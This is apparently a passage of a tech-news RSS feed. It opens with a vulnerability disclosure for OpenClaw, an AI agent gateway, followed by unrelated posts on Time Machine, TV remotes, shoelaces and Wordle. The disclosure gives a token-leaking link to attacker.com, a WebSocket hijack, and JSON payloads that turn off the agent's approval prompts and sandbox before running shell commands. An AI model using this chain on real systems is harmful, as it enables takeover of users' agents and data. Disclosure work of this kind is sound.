</span><span></span><span>void</span><span> </span><span>this</span><span>.request&lt;GatewayHelloOk&gt;(</span><span>"connect"</span><span>, params);</span></code></pre><p>In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&nbsp;</p><p>Here’s a preview of the finding in the depthfirst UI:</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f8d4b908591cf3f915319_Screenshot%202026-01-31%20at%207.19.02%E2%80%AFPM.png" loading="lazy" alt=""></p></figure><h2>1-Click RCE Exploit Kill Chain</h2><h3>Limited Direct Exploitation</h3><p>Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.</p><p>These are the exploit steps:</p><p>1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>.</p><p>2. The attacker listening to WebSocket connections on their server receives the <code>auth</code> token.</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f89d1a1c89e5e19f32bb6_Screeenshot_2.png" loading="lazy" alt=""></p></figure><p>3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.</p><p>The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.</p><p>This is bad enough, but this direct exploitation method has 3 limitations:</p><ol role="list"><li>It does not work on locally-running OpenClaw instances.</li><li>It does not bypass any defensive sandboxing or safety guardrails.</li><li>It does not achieve arbitrary code execution.</li></ol><p><strong>Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.</strong></p><h3>Pivoting to Bypass <code>localhost</code> Network Restrictions</h3><p>Most users run OpenClaw on <code>localhost</code>. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw.&nbsp;</p><p>However, I found a bug to bypass this otherwise frustrating restriction.&nbsp;</p><p>Regularly, <code>attacker.com</code> can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.</p><p>While browsers apply SOP to http connections, they do <em>not</em> to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's <code>origin</code> and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket <code>origin</code> header, accepting requests from <em>any</em> site.</p><p>This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits <code>attacker.com</code>, I can run JavaScript on the victim’s browser to open a connection to <code>ws://localhost:18789</code> . The browser acts as a pivot point between <code>attacker.com</code> and the victim’s otherwise inaccessible <code>localhost</code>.</p><h3>Escaping The Sandbox</h3><p>OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses <code>exec-approvals.json</code> to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.</p><p>However, these protections are managed via the API itself. Because the stolen token grants <code>operator.admin</code> and <code>operator.approvals</code> scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.</p><ol role="list"><li><strong>Disabling User Confirmation:</strong> I send a exec.approvals.set request to set ask: "off". Now the agent won't ask the user for permission to run dangerous commands.</li><li><strong>Escaping Containers:</strong> I send a config.patch request to set tools.exec.host to "gateway". This forces the agent to run commands directly on the host machine, not inside a Docker container.</li></ol><pre contenteditable="false"><code><span>// Payload to disable user prompts</span><span>
</span>{
<span>  </span><span>"method"</span><span>: </span><span>"exec.approvals.set"</span><span>,
</span><span>  </span><span>"params"</span><span>: { </span><span>"defaults"</span><span>: { </span><span>"security"</span><span>: </span><span>"full"</span><span>, </span><span>"ask"</span><span>: </span><span>"off"</span><span> } }
</span>}</code></pre><h3>Complete 1-Click RCE Exploit Killchain</h3><p>Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.</p><ol role="list"><li>Victim visits attacker.com (in practice, an inconspicuous url)</li><li>Client-side JavaScript from <code>attacker.com</code> executes on the victim browser, opening a background window to <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>. This sends the auth token to <code>attacker.com:8080</code></li><li>Client-side JavaScript from <code>attacker.com</code> executing on the victim browser creates a WebSocket connection to <code>ws://localhost:18789</code> (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: <br><ol role="list"><li>disable user confirmation on dangerous commands</li><li>disable any sandboxing</li></ol></li></ol><p>Finally, to achieve arbitrary command execution, the attacker JavaScript executes a <code>node.invoke</code> request:</p><pre contenteditable="false"><code><span>{
</span><span>     </span><span>"type"</span><span>: </span><span>"req"</span><span>,
</span><span>     </span><span>"id"</span><span>: </span><span>"4"</span><span>,
</span><span>     </span><span>"method"</span><span>: </span><span>"node.invoke"</span><span>,
</span><span>     </span><span>"params"</span><span>: {
</span><span>          </span><span>"nodeId"</span><span>: </span><span>"main"</span><span>,
</span><span>          </span><span>"command"</span><span>: </span><span>"system.run"</span><span>,
</span><span>          </span><span>"params"</span><span>: {
</span><span>               </span><span>"cmd"</span><span>: </span><span>"bash -c 'echo hacked &gt; /tmp/hacked'"</span><span>
</span>          },
<span>          </span><span>"timeoutMs"</span><span>: </span><span>60000</span><span>,
</span><span>          </span><span>"idempotencyKey"</span><span>: </span><span>"rev1"</span><span>
</span>     }
<!-- -->}</code></pre><h2>Disclosure &amp; Patch</h2><p>The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the <a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq">GitHub Advisory</a>. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&nbsp;</p><p>All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.</p><p>depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let's talk.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TIL: Apple Broke Time Machine Again on Tahoe (216 pts)]]></title>
            <link>https://taoofmac.com/space/til/2026/02/01/1630</link>
            <guid>46848699</guid>
            <pubDate>Sun, 01 Feb 2026 19:38:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://taoofmac.com/space/til/2026/02/01/1630">https://taoofmac.com/space/til/2026/02/01/1630</a>, See on <a href="https://news.ycombinator.com/item?id=46848699">Hacker News</a></p>
<div id="readability-page-1" class="page"><p><a href="https://taoofmac.com/space/til/2026/02/01/1630">Feb 1<sup>st</sup> 2026</a> · 3 min read
 · <small>
#docker 
#proxmox 
#smb 
#synology 
#til 
#timemachine 
#zfs 
</small>
</p><section id="main">
    <p>So… Here we are again.</p>
<p>Today, after a minor disaster with my <a href="https://taoofmac.com/space/apps/obsidian" rel="next">Obsidian</a> vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> NAS as Time Machine target, exporting the share over <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.</p>
<p>After some research, I found out that the issue is with <a href="https://taoofmac.com/space/com/apple" rel="next">Apple’s</a> unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.</p>
<a id="anchor-what-seems-to-be-working-now" href="https://taoofmac.com/space/til/2026/02/01/1630#what-seems-to-be-working-now" rel="anchor"><h2 id="what-seems-to-be-working-now">What Seems To Be Working Now</h2></a><p>I found <a href="https://gist.github.com/Zahorone/6915be6f5088edb2f64018ce9e4dfe97?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">this gist</a>, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the <code>nsmb.conf</code> file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.</p>
<div><pre><span><code>sudo<span> </span>nano<span> </span>/etc/nsmb.conf<span> </span><span># I used vim, of course</span>
</code></span></pre></div>

<p>…and adding the following lines (the file should be empty):</p>
<div><pre><span><code><span>[default]</span>
<span>signing_required</span><span>=</span><span>yes</span>
<span>streams</span><span>=</span><span>yes</span>
<span>soft</span><span>=</span><span>yes</span>
<span>dir_cache_max_cnt</span><span>=</span><span>0</span>
<span>protocol_vers_map</span><span>=</span><span>6</span>
<span>mc_prefer_wired</span><span>=</span><span>yes</span>
</code></span></pre></div>

<p>The explanation here is that <a href="https://taoofmac.com/space/com/apple/macos" rel="next">macOS</a> Tahoe changed the default from <code>signing_required=no</code> to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.</p>
<p>Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the <code>.sparsebundle</code> name (that wasn’t an issue for me, but YMMV).</p>
<p>On the <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a> side, the recommendation was to go to <code>Control Panel &gt; File Services &gt; SMB &gt; Advanced</code> and set:</p>
<ul>
<li>Maximum SMB protocol: SMB3</li>
<li>Enable Opportunistic Locking: Yes</li>
<li>Enable SMB2 Lease: Yes</li>
<li>Enable SMB Durable Handles: Yes</li>
<li>Server signing: No (or “Auto”)</li>
<li>Transport encryption: Disabled</li>
</ul>
<p>That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:</p>
<figure><img alt="My SMB settings, as of DSM 7.3.2-86009-1" src="https://taoofmac.com/media/til/2026/02/01/1630/fY_oAYhU-aPe6gdiXpboLe7GTwI=/image.png" width="1384" height="1462"><figcaption>My SMB settings, as of DSM 7.3.2-86009-1</figcaption></figure>
<a id="anchor-my-backup-backup-plan" href="https://taoofmac.com/space/til/2026/02/01/1630#my-backup-backup-plan" rel="anchor"><h2 id="my-backup-backup-plan">My Backup Backup Plan</h2></a><p>Since I’m tired of Apple breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.</p>
<p>I already have <a href="https://taoofmac.com/space/blog/2024/12/26/2330" rel="next">a Proxmox server with ZFS as the backend storage</a> that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.</p>
<p>As it happens, <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external"><code>mbentley/timemachine</code></a> is a <a href="https://taoofmac.com/space/os/linux/docker" rel="next">Docker</a> image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:</p>
<div><pre><span><code><span>services</span><span>:</span>
<span>  </span><span>timemachine</span><span>:</span>
<span>    </span><span>image</span><span>:</span><span> </span><span>mbentley/timemachine:smb</span>
<span>    </span><span>container_name</span><span>:</span><span> </span><span>timemachine</span>
<span>    </span><span>restart</span><span>:</span><span> </span><span>always</span>
<span>    </span><span>network_mode</span><span>:</span><span> </span><span>host</span>
<span>    </span><span>environment</span><span>:</span>
<span>      </span><span>-</span><span> </span><span>TM_USERNAME=timemachine</span>
<span>      </span><span>-</span><span> </span><span>TM_GROUPNAME=timemachine</span>
<span>      </span><span>-</span><span> </span><span>PASSWORD=timemachine</span>
<span>      </span><span>-</span><span> </span><span>TM_UID=65534</span><span> </span><span># 'nobody' user</span>
<span>      </span><span>-</span><span> </span><span>TM_GID=65534</span><span> </span><span># 'nobody' group</span>
<span>      </span><span>-</span><span> </span><span>SET_PERMISSIONS=false</span>
<span>      </span><span>-</span><span> </span><span>VOLUME_SIZE_LIMIT=0</span>
<span>    </span><span>volumes</span><span>:</span>
<span>      </span><span># this is a pass-though mountpoint to the ZFS volume in Proxmox</span>
<span>      </span><span>-</span><span> </span><span>/mnt/shares/timemachine:/opt/timemachine</span>
<span>    </span><span>tmpfs</span><span>:</span>
<span>      </span><span>-</span><span> </span><span>/run/samba</span>
</code></span></pre></div>

<p>Right now the first option <em>seems</em> to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the <a href="https://taoofmac.com/space/protocols/smb" rel="next">SMB</a> implementation and avoids relying on <a href="https://taoofmac.com/space/com/synology" rel="next">Synology</a>’s software.</p>
<p>But if anyone from Apple is reading this: please, stop breaking <a href="https://hub.docker.com/r/mbentley/timemachine?utm_source=taoofmac.com&amp;utm_medium=web&amp;utm_campaign=unsolicited_traffic&amp;utm_content=external_link" rel="external">Time Machine</a> every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.</p>
<p>Plus I’m annoyed enough that earlier this morning I tried to set up a new <a href="https://taoofmac.com/space/com/apple/ios" rel="next">iOS</a> device and the infamous <code>Restore in Progress: An estimated 100 MB will be downloaded…</code> bug (which has bitten me repeatedly <em>over the last <strong>six</strong> years</em>) is still there.</p>
<p>The usual fix was hitting <code>Reset Network Settings</code> and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took <em>three</em> attempts.</p>
<p>Come on, Apple, get your act together. Hire people who care about the OS experience, not just <a href="https://taoofmac.com/space/notes/2025/09/15/2359" rel="next">Liquid Glass</a>.</p>
    </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I taught my neighbor to keep the volume down (750 pts)]]></title>
            <link>https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down</link>
            <guid>46848415</guid>
            <pubDate>Sun, 01 Feb 2026 19:00:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down">https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down</a>, See on <a href="https://news.ycombinator.com/item?id=46848415">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody" id="articleBody">
	

<p>When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.</p>

<p>This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.</p>

<p>After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.</p>

<p>After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.</p>

<p><img src="https://cdn.idiallo.com/images/assets/601/remote.jpg" alt="Dish Network Remote 2008">
</p>

<p>One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.</p>

<p>The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.</p>

<p>One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled. </p>

<div>
   <p><img src="https://cdn.idiallo.com/images/assets/601/captain.jpg" alt="I am the captain now"></p><p>I am the captain now.</p>
</div>

<p>Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.</p>

<p>But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.</p>

<p>In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened. </p>

<p>"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.</p>

<p>The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand. </p>

<p>Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.</p>

<p>One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.</p>

<p>Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.</p>

<p>Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.</p>

	<hr>

	
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ian's Shoelace Site (260 pts)]]></title>
            <link>https://www.fieggen.com/shoelace/</link>
            <guid>46848231</guid>
            <pubDate>Sun, 01 Feb 2026 18:38:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fieggen.com/shoelace/">https://www.fieggen.com/shoelace/</a>, See on <a href="https://news.ycombinator.com/item?id=46848231">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
<h2>	Ian's&nbsp;Shoelace&nbsp;Site</h2>

<div id="intro">
  <p><img src="https://www.fieggen.com/shoelace/icons/shoelace-site-0.png" srcset="https://www.fieggen.com/shoelace/icons/shoelace-site-0x.png 2x" alt="Shoelace Site (icon)" title="Ian's Shoelace Site"></p><p>	Fun, fashion &amp; science in the Internet's #1 website about shoelaces – and home of the 
    <a href="https://www.fieggen.com/shoelace/ianknot.htm" title="Ian&nbsp;Knot">
	Ian&nbsp;Knot</a>, the world's fastest shoelace knot. If you want to lace shoes, tie shoes or learn about shoelaces – this is the place!</p>
</div>

<div id="welcome">
  <h2>	Welcome!</h2>
  <p><img src="https://www.fieggen.com/shoelace/professor-shoelace-160.jpg" srcset="https://www.fieggen.com/shoelace/professor-shoelace-320.jpg 2x" alt="Professor Shoelace (pic)" title="Ian Fieggen, aka “Professor Shoelace”"></p><p>	G'day everyone, Ian Fieggen here, also known as <i>“Professor Shoelace”</i>. I'm a
    <a href="https://www.fieggen.com/shoelace/aboutian.htm" title="About Ian Fieggen">
	real human</a> living in Melbourne, Australia. This website has no “A.I.” content – it's all built with “H.I.” plus Human Effort over more than
    <a href="https://www.fieggen.com/shoelace/about-this-site.htm#websitehistory" title="History of Ian's Shoelace Site">
	two decades</a>.</p>
  <p>	Welcome to <i>“Ian's Shoelace Site”</i> – made <b>by</b> one human, <b>for</b> all humans.</p>
</div>

<p>
  <h2>	Table of Contents</h2>
</p>
<div>
  <p><a href="https://www.fieggen.com/shoelace/lacing.htm" title="Lacing Shoes"><img src="https://www.fieggen.com/shoelace/icons/lacing-0.png" srcset="https://www.fieggen.com/shoelace/icons/lacing-0x.png 2x" alt="Lacing (icon)"><span>
	Lacing Shoes</span></a></p><p>	Contains over 100&nbsp;× step-by-step shoe lacing tutorials, over 2,700&nbsp;× shoe lacing photos, plus the interactive <i>“Create-a-Lace”</i> for designing your own lacing.</p>
</div>
<div>
  <p><a href="https://www.fieggen.com/shoelace/tying.htm" title="Tying Shoes"><img src="https://www.fieggen.com/shoelace/icons/tying-0.png" srcset="https://www.fieggen.com/shoelace/icons/tying-0x.png 2x" alt="Tying (icon)"><span>
	Tying Shoes</span></a></p><p>	Contains 25&nbsp;× shoelace knots (including my world's fastest <i>“Ian&nbsp;Knot”</i>), plus info on tying correctly so that they sit straight and stay securely tied
	– yet can be untied without jamming.</p>
</div>
<div>
  <p><a href="https://www.fieggen.com/shoelace/learn.htm" title="Learn About Shoelaces"><img src="https://www.fieggen.com/shoelace/icons/learn-0.png" srcset="https://www.fieggen.com/shoelace/icons/learn-0x.png 2x" alt="Learn (icon)"><span>
	Learn About Shoelaces</span></a></p><p>	Heaps of knowledge about shoelaces, including their construction, length calculations – even what the tips are called, as well as Ian's interviews,
	articles, Q&amp;As and more.</p>
</div>
<div>
  <p><a href="https://www.fieggen.com/shoelace/about.htm" title="About"><img src="https://www.fieggen.com/shoelace/icons/about-0.png" srcset="https://www.fieggen.com/shoelace/icons/about-0x.png 2x" alt="About (icon)"><span>
	About</span></a></p><p>	Information about this website and the site's author, Ian Fieggen – including Ian's contact details.
	Also info on this site's sponsors plus ways that <b>you</b>, too, can support Ian.</p>
</div>

<div>
  <p><a href="https://www.fieggen.com/shoelace/search.htm" title="Search This Site"><img src="https://www.fieggen.com/shoelace/icons/search-0.png" srcset="https://www.fieggen.com/shoelace/icons/search-0x.png 2x" alt="Search (icon)"><span>
	Search This Site</span></a></p><p>	Looking for something? This website has more than <b>300 pages</b> – which can be daunting to wade through!
	Search the whole of <i>Ian's Shoelace Site</i> using Google Custom Search.</p>
</div>

<div id="latestphoto">
  <h2>	Latest Photo</h2>
  <h3 id="20260201a">
	01-Feb-2026</h3>
  <p>	Today's shoe lacing photo was contributed by Guillaume&nbsp;R. in Feb-2026.</p>
  <p>	Tan boots with white trim laced with black &amp; white
    <a href="https://www.fieggen.com/shoelace/overunderlacing.htm" title="Over Under Lacing">
	Over Under Lacing</a> +
    <a href="https://www.fieggen.com/shoelace/doublehelixlacing.htm" title="Double Helix Lacing">
	Double Helix Lacing</a>.</p>
  <p>	Front view of Guillaume's lacing comparison, this time with the shoelaces tightened and knotted.</p>
  <p><img alt="Shoe lacing photo" title="Tan boots with white trim laced with black &amp; white Over Under Lacing + Double Helix Lacing (from Guillaume&nbsp;R.)" src="https://www.fieggen.com/Dont_Link/pics26/CmbOvrDoh002.jpg" srcset="https://www.fieggen.com/Dont_Link/pics26/CmbOvrDoh002x.jpg 2x"></p><p><a href="https://www.fieggen.com/shoelace/lacingphotos.php" title="More photos on the Shoe Lacing Photos page">
	More Shoe Lacing Photos</a></p>
</div>

<p id="whatsnew">
  <h2>	What's New?</h2>
</p>

<div id="20251204b">
  <p><a href="https://www.fieggen.com/shoelace/interview-2017-10-puma.htm" title="Added PUMA Interview"><img src="https://www.fieggen.com/shoelace/icons/puma-rainbow-0.png" srcset="https://www.fieggen.com/shoelace/icons/puma-rainbow-0x.png 2x" alt="PUMA (icon)"><span>
	Updated “Interviews &amp; Articles”</span></a></p><p><b>04-Dec-2025</b> – During Australia's marriage equality debate, PUMA engaged me to create the “Equality Knot”, then sent a film crew to shoot this “content piece” video.</p>
</div>
<div id="20251202b">
  <p><a href="https://www.fieggen.com/shoelace/pentagramlacing.htm" title="Updated “Pentagram Lacing”"><img src="https://www.fieggen.com/shoelace/pics25/inverted-pentagram-lacing-0.png" srcset="https://www.fieggen.com/shoelace/pics25/inverted-pentagram-lacing-0x.png 2x" alt="Inverted Pentagram Lacing (icon)"><span>
	Updated “Pentagram Lacing”</span></a></p><p><b>02-Dec-2025</b> – Following a visitor request, I added diagrams for the inverted variation of Pentagram Lacing for 7, 6 and 5&nbsp;pairs of eyelets.</p>
</div>
<div id="20251128b">
  <p><a href="https://www.fieggen.com/shoelace/lacingmethods.htm" title="Updated “Shoe Lacing Methods”"><img src="https://www.fieggen.com/shoelace/pics25/lacing-methods-filtering-0.png" srcset="https://www.fieggen.com/shoelace/pics25/lacing-methods-filtering-0x.png 2x" alt="Lacing methods (icon)"><span>
	Updated “Shoe Lacing Methods”</span></a></p><p><b>28-Nov-2025</b> – Following a suggestion from a website visitor, I added buttons to filter by either “Shortening” or “Lengthening” methods.</p>
</div>





<div id="feedback">
  <h2>	Recent Visitor Feedback</h2>
<!--
  <div>
    <p>	</p>
    <p>	– </p>
  </div>
  <div class="comment">
    <p>	</p>
    <p>	– Ian Fieggen</p>
  </div>
-->
  <div>
    <p>	Can't believe that I've been tying my shoelaces wrongly for 50 years! Never too late to learn I guess... many thanks</p>
    <p>	– Mike B., UK, Feb-2026</p>
  </div>
  
  <div>
    <p>	Tonight I was having a grand time looking through your shoe lacing tutorials for fun,
	and then I saw that you <i>actually invented</i> my favorite way to tie my shoes and show off a little bit!</p>
    <p>	I yelled “HE INVENTED THIS KNOT? I KNOW THAT KNOT!!!” (and scared my cat a little bit hahahaha)</p>
    <p>	Anyways just wanted to thank you for having a great website, I’m really enjoying it and can’t wait to try out some of the decorative lacing on my boots!</p>
    <p>	– Selkie, Los Angeles, USA, Feb-2026</p>
  </div>
  <div>
    <p>	When the Canadian Forces' lacing instructions were at best a 2/10 I got referenced to this site and never looked back, thank you.</p>
    <p>	– Andres S., Canada, Jan-2026</p>
  </div>
  
  <div>
    <p>	Love the site! Been checking it on occasion for years, and I have been using the Ian [k]not for so long I don't remember how to tie the normal bow.
	Hadn't occurred to me I could donate until I saw Chris Person's article.</p>
    <p>	– Baynard N., USA, Jan-2026</p>
  </div>
  
  <div>
    <p>	I've been a big fan of your site for years though haven't visited for a while.
	I was sad to hear in an article on Gizmodo that your site income is difficult to maintain, so this is my modest thanks for your site's great content.</p>
    <p>	– Liam G., UK, Jan-2026</p>
  </div>
  
</div>
<p>	If you'd also like to send feedback, please
    <a href="https://www.fieggen.com/shoelace/contact.htm" title="Contact Ian via e-mail">
	Contact&nbsp;Ian</a>.</p>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Crisis comes to Wordle: Reusing old words (111 pts)]]></title>
            <link>https://forkingmad.blog/wordle-crisis/</link>
            <guid>46847924</guid>
            <pubDate>Sun, 01 Feb 2026 17:54:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forkingmad.blog/wordle-crisis/">https://forkingmad.blog/wordle-crisis/</a>, See on <a href="https://news.ycombinator.com/item?id=46847924">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    

    

    
        

        <p>
            <i>
                <time datetime="2026-02-01T14:10Z">
    01 Feb, 2026
</time>
            </i>
        </p>
    

    <p>A few days ago, The new York Times (owner of Wordle) announced that from 2 February it would start reusing some words from previous years.</p>
<p>Their announcement started:</p>
<blockquote>
<p>Hey, Wordlers! We have some exciting news to share</p>
</blockquote>
<p>and continued</p>
<blockquote>
<p>Starting on Monday, we will begin adding previously run words back into play. There are still many first-time answers to debut, but also more chances for Wordle in ones and those magical, serendipitous moments when Wordle overlaps with real life. Happy solving!</p>
</blockquote>
<p>Firstly, whoever wrote this nonsense deserves an award for fake cheerfulness.  There is absolutely no "exciting news" in that paragraph.</p>
<p>It has caused a bit of a stir in the Wordle Community.  Many wondering why, and some suggesting they will now stop playing the <em>dumbed down</em> version.</p>
<h2 id="it-got-me-thinking">It got me thinking</h2><p>Are they running out of five-letter words?  I've gathered the data and crunched the numbers, and here are my findings:</p>
<p>Firstly, I started with a list of English words. I've actually had a list for some time, and I knew one day it would come in useful.  It contains 466,547 words: from <em>aahed</em> <sup id="fnref-1"><a href="#fn-1">1</a></sup> to <em>zugzwang</em> <sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>I then narrowed that down to five-letter words (22,949) before excluding plurals, which are not used in Wordle, and Proper Nouns (such as Paris, or March -- anything with uppercase first letter, but leaving "march" for example).  The list was down to 10,784 words.</p>
<p>Finally, one more trip through the sausage machine.  I put this list in a word processor and calculated how many spelling errors there were.  This, roughly, would help me identify the more <em>common</em> five-letter words.  I doubt many of us could use <em>valew</em> <sup id="fnref-3"><a href="#fn-3">3</a></sup> in a sentence.</p>
<p>We now have a more manageable potential Wordle list of 5,437 words.</p>
<h2 id="the-longevity-of-five-thousand-words">The longevity of five-thousand words?</h2><p>A word-a-day from that list would yield almost 15 years of daily challenges.  Wordle has been running since October 2021.  By my reckoning we have enough to run until 2036</p>
<h2 id="nyt-why">NYT, Why?</h2><p>So that does beg the question: New York Times - why start repeating?</p>
<div>
<p>Leave a <a href="https://komments.cloud/9765bf35b84ddf081e1fcc0">Comment</a>; Or copy this <a onclick="ShowAndHide()">post id</a> and search for it in your Fediverse client to reply; Or <a href="https://forkingmad.blog/contact">send a message</a>. If you have replied with your own blog post and I will mention it here.</p>
<p>https://gofer.social/@daj/statuses/01KGCRW6RR3XWCYYHBKW7YHKRJ</p>
</div>
<section>
<ol>
<li id="fn-1"><p>Expressed amazement with prolonged "aah."<a href="#fnref-1">↩</a></p></li>
<li id="fn-2"><p>A situation in which someone is forced to make a disadvantageous move<a href="#fnref-2">↩</a></p></li>
<li id="fn-3"><p>Obsolete word for an expression of gratitude or satisfaction<a href="#fnref-3">↩</a></p></li>
</ol>
</section>


    

    
        
            <p>
                
